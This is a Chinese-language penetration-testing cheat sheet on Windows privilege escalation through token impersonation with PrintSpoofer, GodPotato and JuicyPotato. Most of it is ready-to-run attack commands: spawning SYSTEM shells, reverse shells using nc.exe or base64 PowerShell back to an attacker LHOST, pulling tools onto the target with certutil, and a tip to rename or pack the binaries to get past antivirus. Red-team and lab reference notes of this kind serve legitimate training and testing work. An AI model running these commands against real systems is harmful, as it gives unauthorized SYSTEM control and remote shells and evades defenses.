---
cmd_type: PrivEsc
os: windows
tags:
  - cmd
syntax: whoami /priv
---

# Token 模拟 Potato 家族

## 适用场景

- 当前服务账号（如 IIS、SQL Server、备份服务）具备 `SeImpersonatePrivilege` 或 `SeAssignPrimaryTokenPrivilege`。
- 目标是 SYSTEM（通过模拟 NT AUTHORITY\SYSTEM 的 token 拉起新进程）。

## 枚举命令

```bash
whoami /priv                        # 查看当前用户特权
whoami /groups                      # 查看组成员（确认是否是服务账号）
whoami                              # 查看当前身份
systeminfo                          # 查看系统版本（判断用哪个 Potato）
```

## 利用步骤

### 1. 确认前提

`whoami /priv` 输出里必须含以下之一：

```text
SeImpersonatePrivilege        Impersonate a client after authentication    Enabled
SeAssignPrimaryTokenPrivilege Replace a process level token                Enabled
```

### 2. PrintSpoofer（Win10 / Server 2016+ 首选）

```bash
# 直接以 SYSTEM 执行 cmd
PrintSpoofer64.exe -i -c cmd
# 反弹 shell
PrintSpoofer64.exe -c "powershell -e <BASE64_REVERSE_SHELL>"
# 或者先传 nc
PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <LHOST> <LPORT> -e cmd.exe"
```

### 3. GodPotato（较新系统，含 Server 2016/2019/2022）

```bash
# 直接执行命令回显
GodPotato.exe -cmd "cmd /c whoami"
# 反弹 shell
GodPotato.exe -cmd "cmd /c C:\Windows\Temp\nc.exe <LHOST> <LPORT> -e cmd.exe"
# 带 Impersonate 令牌
GodPotato.exe -cmd "cmd /c whoami" -t
```

### 4. JuicyPotato（老系统：Win7/8、Server 2008/2012）

```bash
# 需要指定 COM 端口（-l 1337），-t * 尝试默认 CLSID（老系统可用）
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *
# 指定 CLSID（从 CLSID 列表选与目标系统匹配的）
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\Windows\Temp\nc.exe <LHOST> <LPORT> -e cmd.exe" -t * -c {B91D5831-B1BD-4608-8198-D72E155020F7}
```

## 常见坑

- 只有 `SeImpersonatePrivilege` 才走 Potato 系列；只有 `SeDebugPrivilege` 不行，别混淆。
- 老系统用 JuicyPotato，较新系统（Server 2016+）用 PrintSpoofer / GodPotato，版本选错会导致 token 模拟失败。
- JuicyPotato 依赖可用 COM 端口，默认 `-l 1337` 被占用时换端口并配对应 CLSID。
- 目标机需先上传工具（`certutil -urlcache -split -f http://<LHOST>/PrintSpoofer64.exe`），目录用 `C:\Windows\Temp` 等可写路径。
- 杀软常标记 Potato 家族二进制，落地前可考虑重命名或加壳绕过。

## 参考开源项目

- PrintSpoofer — https://github.com/itm4n/PrintSpoofer
- GodPotato — https://github.com/BeichenDream/GodPotato
- JuicyPotato — https://github.com/ohpe/juicy-potato
